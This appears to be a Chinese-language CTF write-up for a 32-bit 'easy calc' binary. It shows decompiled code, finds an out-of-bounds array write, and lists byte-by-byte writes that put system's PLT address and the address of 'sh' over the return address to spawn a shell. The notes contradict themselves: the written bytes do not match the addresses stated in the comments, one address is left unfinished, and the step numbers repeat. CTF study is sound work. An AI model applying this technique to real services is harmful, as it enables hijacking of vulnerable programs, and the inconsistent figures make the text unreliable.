0.retn操作：先eip=esp，然后esp=esp+4
retn N操作：先eip=esp，然后esp=esp+4+N

还有关于利用gadget修改寄存器的操作，这种一般都是"gadget地址"+“要修改寄存器的值”+“下一个地址”
这里的流程是：
原函数返回–>程序指向gadget地址–>这个地址出栈–>进入gadget–>从中pop，寄存器值被修改，栈中值出栈–>返回地址

1、打开IDA，按下F5，大致流程如下：
int __cdecl main(int argc, const char **argv, const char **envp)
{
  //打印信息
  puts("***********************************************************");
  puts("*                      An easy calc                       *");
  puts("*Give me your numbers and I will return to you an average *");
  puts("*(0 <= x < 256)                                           *");
  puts("***********************************************************");
  //输入数字个数
  puts("How many numbers you have:");
  __isoc99_scanf("%d", &v5);
  //将输入的数字放于数组中
  puts("Give me your numbers");
  //简化处理
  while（1）
  {
	puts("1. show numbers\n2. add number\n3. change number\n4. get average\n5. exit");
        __isoc99_scanf("%d", &v6);
	if(v6==1)
	{
		 puts("id\t\tnumber");
        	 for ( k = 0; k < j; ++k )
         		 printf("%d\t\t%d\n", k, v13[k]);
	}
	if(v6==2)
	{
		puts("Give me your number");
          	__isoc99_scanf("%d", &v7);
          	if ( j <= 0x63 )
          	{
            		v3 = j++;
            		v13[v3] = v7;
         	 }	
	}
	if(v6==3)
	{
		puts("which number to change:");
      		__isoc99_scanf("%d", &v5);
      		puts("new number:");
      		__isoc99_scanf("%d", &v7);
      		v13[v5] = v7;
	}
	if(v6==4)
	{
		 v9 = 0;
    		 for ( l = 0; l < j; ++l )
     			 v9 += v13[l];
	}
		
  }
1、值得注意的是当输入3进行change number的时候，直接将v7赋值给数组v13[v5]，没有对v5进行范围检查，从而会造成ROP攻击。
   为此，我们需要知道栈顶距离返回地址的位置，才能在主函数返回时，直接执行我们的shellcode。
   按照writeup，下了两个断点，分别是在给v13数组赋初值和返回retn的时候。
   为此，下两个断点，分别是0x80486D5和0x80488F2。
   *EAX  0xffffd138 ◂— 0x1(数组的首地址)。
   *ESP  0xffffd1bc —▸ 0xf7df1ef1 (__libc_start_main+241) ◂— add    esp, 0x10(函数的返回地址)//当函数运行到return语句的时候，栈顶一定是返回地址。
   0xffffd1bc-0xffffd138=0x84。
2、使用UE，寻找sh字符串的地址，发现sh的地址为0x
   change(0x84, 0x50)
   change(0x85, 0x84)
   change(0x86, 0x04)
   change(0x87, 0x08)//system的plt地址：0x804850
   change(0x8c, 0x87)
   change(0x8d, 0x89)
   change(0x8e, 0x04)
   change(0x8f, 0x08)//sh字符串的地址：0x8048980
2、左边的函数中有hackhere函数，但是实际上服务器没有bash的选项，该函数是干扰项，不过需要字符串“sh”。

